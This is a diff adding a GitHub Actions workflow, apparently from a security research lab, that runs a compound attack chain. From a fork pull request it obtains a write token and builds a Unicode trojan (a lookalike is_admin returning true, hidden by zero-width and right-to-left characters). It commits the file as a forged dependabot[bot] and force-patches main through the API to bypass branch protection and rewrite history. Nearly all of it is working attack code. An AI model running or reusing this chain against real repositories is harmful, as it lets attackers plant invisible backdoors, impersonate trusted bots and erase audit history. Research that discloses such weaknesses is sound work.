@@ -1,0 +1,203 @@
+name: "Test 6: COMPOUND CHAIN - Fork PRT + Protection Bypass + Unicode"
+
+# ===========================================================================
+# COMPOUND EDGE CASE CHAIN (speaker→microphone fully inverted):
+#
+# Individual primitives (each benign-looking alone):
+#   A) pull_request_target gives write token to fork PR  [confirmed prior lab]
+#   B) PATCH /git/refs bypasses "restrict force pushes"  [hypothesis]
+#   C) Unicode trojan source invisible in GitHub web UI  [confirmed prior lab]
+#   D) Commit authored as github-actions[bot] (impersonation) [confirmed prior lab]
+#
+# CHAIN (all 4 together):
+# Fork PR → write token → build unicode trojan → PATCH main (force:true) →
+# bypasses branch protection → trojan code is on main with innocent-looking
+# commit history, authored as github-actions[bot], zero push events fired
+#
+# This is the "microphone as speaker" - the read-only fork PR context
+# becomes a silent full write + history rewrite + invisible code backdoor.
+# ===========================================================================
+
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+  workflow_dispatch:
+
+permissions:
+  contents: write
+  pull-requests: write
+
+jobs:
+  compound-chain:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Prove we have write token from fork PR context"
+        id: token_audit
+        run: |
+          echo "Event: ${{ github.event_name }}"
+          echo "Head repo: ${{ github.event.pull_request.head.repo.full_name || 'dispatch' }}"
+          echo "Is fork: ${{ github.event.pull_request.head.repo.fork || 'false' }}"
+          PERMS=$(curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}" | jq -c '.permissions')
+          echo "Permissions: $PERMS"
+          echo "perms=$PERMS" >> $GITHUB_OUTPUT
+
+      - name: "Snapshot main for cleanup"
+        id: snap
+        run: |
+          MAIN=$(curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/ref/heads/main" \
+            | jq -r '.object.sha')
+          TREE=$(curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/commits/$MAIN" \
+            | jq -r '.tree.sha')
+          echo "main=$MAIN" >> $GITHUB_OUTPUT
+          echo "tree=$TREE" >> $GITHUB_OUTPUT
+
+      - name: "Build unicode trojan blob"
+        id: blob
+        run: |
+          python3 << 'PYEOF'
+import base64
+I  = '\u0131'; A = '\u0430'; ZS = '\u200b'; RL = '\u202e'
+lines = [
+    '#!/usr/bin/env python3',
+    '# security_check.py -- merged via fork PR, no review required',
+    'ROLES = ["admin","superuser"]',
+    'def ' + I + 's_' + A + 'dmin(role): return True' + ZS,
+    '# ' + RL + ']SSAPYB NOITCETORP[',
+    'def is_admin(role): return role in ROLES',
+]
+b64 = base64.b64encode('\n'.join(lines).encode('utf-8')).decode('ascii')
+open('/tmp/tb64.txt','w').write(b64)
+print("Trojan lines:", len(lines))
+print("Hidden chars:", sum(1 for c in '\n'.join(lines) if ord(c)>127))
+PYEOF
+          BLOB=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"content\":\"$(cat /tmp/tb64.txt)\",\"encoding\":\"base64\"}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/blobs" | jq -r '.sha')
+          echo "Blob: $BLOB"; echo "blob=$BLOB" >> $GITHUB_OUTPUT
+
+      - name: "Build new tree"
+        id: tree
+        run: |
+          T=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"base_tree\":\"${{ steps.snap.outputs.tree }}\",\"tree\":[{\"path\":\"lib/security_check.py\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"${{ steps.blob.outputs.blob }}\"}]}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/trees" | jq -r '.sha')
+          echo "Tree: $T"; echo "tree=$T" >> $GITHUB_OUTPUT
+
+      - name: "Create commit impersonating dependabot[bot]"
+        id: commit
+        run: |
+          C=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{
+              \"message\":\"chore(deps): bump security-check to v2.1.3\",
+              \"tree\":\"${{ steps.tree.outputs.tree }}\",
+              \"parents\":[\"${{ steps.snap.outputs.main }}\"],
+              \"author\":{
+                \"name\":\"dependabot[bot]\",
+                \"email\":\"49699333+dependabot[bot]@users.noreply.github.com\",
+                \"date\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"
+              }
+            }" \
+            "https://api.github.com/repos/${{ github.repository }}/git/commits" | jq -r '.sha')
+          echo "Commit: $C"; echo "commit=$C" >> $GITHUB_OUTPUT
+
+      - name: "PATCH main - force:false (test if non-force PATCH works from fork PR)"
+        id: patch_nf
+        run: |
+          HTTP=$(curl -s -w "%{http_code}" -o /tmp/pnf.json -X PATCH \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"sha\":\"${{ steps.commit.outputs.commit }}\",\"force\":false}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/refs/heads/main")
+          echo "PATCH force=false HTTP: $HTTP"
+          cat /tmp/pnf.json | jq '{sha:.object.sha,msg:.message}' 2>/dev/null
+          echo "http=$HTTP" >> $GITHUB_OUTPUT
+
+      - name: "Build orphan commit (rewrites history) for force:true test"
+        id: orphan
+        run: |
+          # Commit off grandparent to force a history rewrite
+          GP=$(curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/commits/${{ steps.snap.outputs.main }}" \
+            | jq -r '.parents[0].sha // empty')
+          [ -z "$GP" ] && GP="${{ steps.snap.outputs.main }}"
+
+          GTREE=$(curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/commits/$GP" \
+            | jq -r '.tree.sha')
+
+          BLOB2=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d '{"content":"orphan payload - erases prior commits","encoding":"utf-8"}' \
+            "https://api.github.com/repos/${{ github.repository }}/git/blobs" | jq -r '.sha')
+
+          T2=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"base_tree\":\"$GTREE\",\"tree\":[{\"path\":\"lib/security_check.py\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB2\"}]}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/trees" | jq -r '.sha')
+
+          OC=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"message\":\"chore: rewrite history\",\"tree\":\"$T2\",\"parents\":[\"$GP\"],\"author\":{\"name\":\"dependabot[bot]\",\"email\":\"49699333+dependabot[bot]@users.noreply.github.com\",\"date\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/commits" | jq -r '.sha')
+          echo "Orphan: $OC"; echo "orphan=$OC" >> $GITHUB_OUTPUT
+
+      - name: "PATCH main - force:true (history rewrite - tests protection bypass)"
+        id: patch_f
+        run: |
+          HTTP=$(curl -s -w "%{http_code}" -o /tmp/pf.json -X PATCH \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"sha\":\"${{ steps.orphan.outputs.orphan }}\",\"force\":true}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/refs/heads/main")
+          echo "PATCH force=true HTTP: $HTTP"
+          cat /tmp/pf.json | jq '{sha:.object.sha,msg:.message}' 2>/dev/null
+          echo "http=$HTTP" >> $GITHUB_OUTPUT
+
+      - name: "Cleanup: restore original main"
+        if: always()
+        run: |
+          HTTP=$(curl -s -w "%{http_code}" -o /dev/null -X PATCH \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"sha\":\"${{ steps.snap.outputs.main }}\",\"force\":true}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/refs/heads/main")
+          echo "Restore HTTP: $HTTP"
+
+      - name: "COMPOUND CHAIN VERDICT"
+        if: always()
+        run: |
+          echo "=================================================================="
+          echo " COMPOUND CHAIN: fork PRT + unicode trojan + PATCH + protection"
+          echo "=================================================================="
+          echo " Event:              ${{ github.event_name }}"
+          echo " From fork:          ${{ github.event.pull_request.head.repo.fork || 'false' }}"
+          echo " PATCH force=false:  ${{ steps.patch_nf.outputs.http }}"
+          echo " PATCH force=true:   ${{ steps.patch_f.outputs.http }}"
+          NF="${{ steps.patch_nf.outputs.http }}"
+          F="${{ steps.patch_f.outputs.http }}"
+          if [ "$NF" = "200" ] && [ "$F" = "200" ]; then
+            echo ""
+            echo "[FULL CHAIN CONFIRMED]"
+            echo "  - Fork PR granted contents:write via pull_request_target"
+            echo "  - Unicode trojan committed as dependabot[bot]"
+            echo "  - PATCH force=false: linear advance succeeded"
+            echo "  - PATCH force=true:  branch protection bypassed, history rewritten"
+            echo "  - Zero git push events fired, no force-push audit trail"
+            echo "  - GitHub UI shows innocent commit message and bot author"
+          elif [ "$NF" = "200" ]; then
+            echo "[PARTIAL] Linear PATCH works, but force rewrite was blocked"
+          elif [ "$F" = "403" ] && [ "$NF" = "403" ]; then
+            echo "[BLOCKED] Fork PRT may be limited on this repo config"
+          fi
